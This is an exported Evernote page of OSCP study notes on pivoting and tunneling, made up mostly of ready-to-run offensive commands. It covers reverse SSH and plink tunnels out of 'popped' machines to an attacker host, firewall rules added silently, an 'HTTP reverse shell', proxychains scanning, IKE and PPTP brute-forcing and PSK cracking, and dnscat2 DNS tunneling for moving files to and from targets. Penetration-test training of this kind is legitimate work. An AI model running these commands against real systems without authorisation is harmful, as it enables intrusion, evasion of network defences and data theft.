<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/><meta name="exporter-version" content="Evernote Mac 6.13.1 (455785)"/><meta name="keywords" content="OSCP, Security"/><meta name="author" content="Anas"/><meta name="created" content="2018-01-06 21:32:08 +0000"/><meta name="source" content="desktop.win"/><meta name="source-application" content="evernote.win32"/><meta name="updated" content="2018-01-06 22:16:38 +0000"/><title>Networking, Pivoting and Tunneling</title></head><body><div><ul><li><b><font style="font-size: 10pt;">Port Forwarding</font></b> - accept traffic on a given IP address and port and redirect it to a different IP address and port<br/></li></ul></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>apt-get install rinetd</div><div><br/></div><div>cat /etc/rinetd.conf</div><div><br/></div><div># bindadress bindport connectaddress connectport</div><div>w.x.y.z 53 a.b.c.d 80</div></div><div><br/></div><div><ul><li><b><font style="font-size: 10pt;">SSH Local Port Forwarding</font></b>: supports bi-directional communication channels</li></ul></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>ssh &lt;gateway&gt; -L &lt;local port to listen&gt;:&lt;remote host&gt;:&lt;remote port&gt;</div></div><div><br/></div><div><ul><li><b><font style="font-size: 10pt;">SSH Remote Port Forwarding:</font></b> Suitable for popping a remote shell on an internal non routable network</li></ul></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>ssh &lt;gateway&gt; -R &lt;remote port to bind&gt;:&lt;local host&gt;:&lt;local port&gt;</div></div><div><br/></div><div><ul><li><b><font style="font-size: 10pt;">SSH Dynamic Port Forwarding</font></b>: create a SOCKS4 proxy on our local attacking box to tunnel ALL incoming traffic to ANY host in the DMZ network on ANY PORT</li></ul></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>ssh -D &lt;local proxy port&gt; -p &lt;remote port&gt; &lt;target&gt;</div></div><div><br/></div><div><ul><li><b><font style="font-size: 10pt;">Proxychains</font></b> - Perform nmap scan within a DMZ from an external computer<br/></li></ul></div><div><br/></div><div><ul><li><font style="font-size: 10pt;">Create reverse SSH tunnel from Popped machine on :2222</font></li></ul></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>ssh -f -N -T -R22222:localhost:22 <a href="http://yourpublichost.example.com/">yourpublichost.example.com</a></div><div>ssh -f -N -R 2222:&lt;local host&gt;:22 root@&lt;remote host&gt;</div></div><div><br/></div><div><ul><li><font style="font-size: 10pt;">Create a Dynamic application-level port forward on 8080 thru 2222</font></li></ul></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>ssh -f -N -D &lt;local host&gt;:8080 -p 2222 hax0r@&lt;remote host&gt;</div></div><div>&nbsp;&nbsp;</div><div><ul><li><font style="font-size: 10pt;">Leverage the SSH SOCKS server to perform Nmap scan on network using proxy chains</font></li></ul></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>proxychains nmap --top-ports=20 -sT -Pn $ip/24</div></div><div><br/></div><div><ul><li><b><font style="font-size: 10pt;">HTTP Tunneling</font></b><br/></li></ul></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nc -vvn $ip 8888</div></div><div><hr/></div><div><b><font style="font-size: 16pt;">Traffic Encapsulation</font></b> - Bypassing deep packet inspection<br/></div><div><br/></div><div><ul><li><b><font style="font-size: 10pt;">http tunnel</font></b><br/></li><ul><li><font style="font-size: 10pt;">On server side:</font></li></ul></ul></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>sudo hts -F &lt;server ip addr&gt;:&lt;port of your app&gt; 80</div></div><div><br/></div><div><ul><li><font style="font-size: 10pt;">On client side:</font></li></ul></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>sudo htc -P &lt;my <a href="http://proxy.com:proxy/">proxy.com:proxy</a> port&gt; -F &lt;port of your app&gt; &lt;server ip addr&gt;:80 stunnel</div></div><div><br/></div><div><ul><li><font style="font-size: 10pt;"><b>Tunnel Remote Desktop (RDP) from a Popped Windows machine to your network</b></font><br/></li></ul></div><div><br/></div><div><ul><li><font style="font-size: 10pt;">Tunnel on port 22</font></li></ul></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>plink -l root -pw pass -R 3389:&lt;localhost&gt;:3389 &lt;remote host&gt;</div></div><div><br/></div><div><ul><li><font style="font-size: 10pt;">Port 22 blocked? Try port 80? or 443?</font></li></ul></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>plink -l root -pw 23847sd98sdf987sf98732 -R 3389:&lt;local host&gt;:3389 &lt;remote host&gt; -P80</div></div><div><br/></div><div><ul><li><b><font style="font-size: 10pt;">Tunnel Remote Desktop (RDP) from a Popped Windows using HTTP Tunnel (bypass deep packet inspection)</font></b><br/></li></ul></div><div><br/></div><div><ul><li><font style="font-size: 10pt;">Windows machine add required firewall rules without prompting the user</font></li></ul></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>netsh advfirewall firewall add rule name="httptunnel_client" dir=in action=allow program="httptunnel_client.exe" enable=yes</div><div><br/></div><div>netsh advfirewall firewall add rule name="3000" dir=in action=allow protocol=TCP localport=3000</div><div><br/></div><div>netsh advfirewall firewall add rule name="1080" dir=in action=allow protocol=TCP localport=1080</div><div><br/></div><div>netsh advfirewall firewall add rule name="1079" dir=in action=allow protocol=TCP localport=1079</div></div><div><br/></div><div><ul><li><font style="font-size: 10pt;">Start the http tunnel client</font></li></ul></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>httptunnel_client.exe</div></div><div><br/></div><div><ul><li><font style="font-size: 10pt;">Create HTTP reverse shell by connecting to localhost port 3000</font></li></ul></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>plink -l root -pw 23847sd98sdf987sf98732 -R 3389:&lt;local host&gt;:3389 &lt;remote host&gt; -P 3000</div></div><div><br/></div><div><ul><li><b><font style="font-size: 10pt;">VLAN Hopping</font></b><br/></li></ul></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>git clone <a href="https://github.com/nccgroup/vlan-hopping.git">https://github.com/nccgroup/vlan-hopping.git</a></div><div>chmod 700 frogger.sh</div><div>./frogger.sh</div></div><div><br/></div><div><ul><li><b><font style="font-size: 10pt;">VPN Hacking</font></b></li></ul></div><div><ul><li><font style="font-size: 10pt;">Identify VPN servers:</font></li></ul></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>./udp-protocol-scanner.pl -p ike $ip</div></div><div><br/></div><div><ul><li><font style="font-size: 10pt;">Scan a range for VPN servers:</font></li></ul></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>./udp-protocol-scanner.pl -p ike -f ip.txt</div></div><div><br/></div><div><ul><li><font style="font-size: 10pt;">Use IKEForce to enumerate or dictionary attack VPN servers:</font></li></ul></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>pip install pyip</div><div>git clone <a href="https://github.com/SpiderLabs/ikeforce.git">https://github.com/SpiderLabs/ikeforce.git</a></div></div><div><br/></div><div><ul><li><font style="font-size: 10pt;">Perform IKE VPN enumeration with IKEForce:</font></li></ul></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>./ikeforce.py TARGET-IP –e –w wordlists/groupnames.dic</div></div><div><br/></div><div><ul><li><font style="font-size: 10pt;">Bruteforce IKE VPN using IKEForce:</font></li></ul></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>./ikeforce.py TARGET-IP -b -i groupid -u dan -k psk123 -w passwords.txt -s 1</div></div><div><br/></div><div><ul><li><font style="font-size: 10pt;">Use ike-scan to capture the PSK hash:</font></li></ul></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>ike-scan</div><div>ike-scan TARGET-IP</div><div>ike-scan -A TARGET-IP</div><div>ike-scan -A TARGET-IP --id=myid -P TARGET-IP-key</div><div>ike-scan –M –A –n example\_group -P hash-file.txt TARGET-I</div></div><div><br/></div><div><ul><li><font style="font-size: 10pt;">Use psk-crack to crack the PSK hash</font></li></ul></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>psk-crack hash-file.txt</div><div>pskcrack</div><div>psk-crack -b 5 TARGET-IPkey</div><div>psk-crack -b 5 --charset="01233456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz" 192-168-207-134key</div><div>psk-crack -d /path/to/dictionary-file TARGET-IP-key</div></div><div><br/></div><div><ul><li><b><font style="font-size: 10pt;">PPTP Hacking</font></b><br/></li></ul></div><div><br/></div><div><ul><li><font style="font-size: 10pt;">Identifying PPTP, it listens on TCP: 1723 NMAP PPTP Fingerprint:</font></li></ul></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>nmap –Pn -sV -p 1723 TARGET(S)</div></div><div><br/></div><div><ul><li><font style="font-size: 10pt;">PPTP Dictionary Attack</font></li></ul></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>thc-pptp-bruter -u hansolo -W -w /usr/share/wordlists/nmap.lst</div></div><div><br/></div><div><ul><li><b><font style="font-size: 10pt;">Port Forwarding/Redirection</font></b><br/></li></ul></div><div><br/></div><div><ul><li><font style="font-size: 10pt;">PuTTY Link tunnel - SSH Tunneling</font></li></ul></div><div><br/></div><div><ul><li><font style="font-size: 10pt;">Forward remote port to local address:</font></li></ul></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>plink.exe -P 22 -l root -pw "1337" -R 445:&lt;local host&gt;:445 &lt;remote host&gt;</div></div><div><br/></div><div><ul><li><font style="font-size: 10pt;"><b>SSH Pivoting</b></font><br/></li></ul></div><div><br/></div><div><ul><li><font style="font-size: 10pt;">SSH pivoting from one network to another:</font></li></ul></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>ssh -D &lt;local host&gt;:1010 -p 22 user@&lt;remote host&gt;</div></div><div><br/></div><div><ul><li><font style="font-size: 10pt;"><b>DNS Tunneling</b></font><br/></li></ul></div><div><br/></div><div><ul><li><font style="font-size: 10pt;"><b>dnscat2</b> supports “download” and “upload” commands for getting files (data and programs) to and from the target machine.</font></li></ul></div><div><br/></div><div><ul><li><font style="font-size: 10pt;">Attacking Machine Installation:</font></li></ul></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>apt-get update</div><div>apt-get -y install ruby-dev git make g++</div><div>gem install bundler</div><div>git clone <a href="https://github.com/iagox86/dnscat2.git">https://github.com/iagox86/dnscat2.git</a></div><div>cd dnscat2/server</div><div>bundle instal</div></div><div><br/></div><div><ul><li><font style="font-size: 10pt;">Run dnscat2:</font></li></ul></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>ruby ./dnscat2.rb</div><div>dnscat2&gt; New session established: 1422</div><div>dnscat2&gt; session -i 1422</div></div><div><br/></div><div><ul><li><font style="font-size: 10pt;">Target Machine:</font></li></ul></div><div>&nbsp;&nbsp;(<a href="https://downloads.skullsecurity.org/dnscat2/">https://downloads.skullsecurity.org/dnscat2/</a>)</div><div>(<a href="https://github.com/lukebaggett/dnscat2-powershell/">https://github.com/lukebaggett/dnscat2-powershell/</a>)</div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>dnscat --host &lt;dnscat server ip&gt;</div></div><div><br/></div></body></html>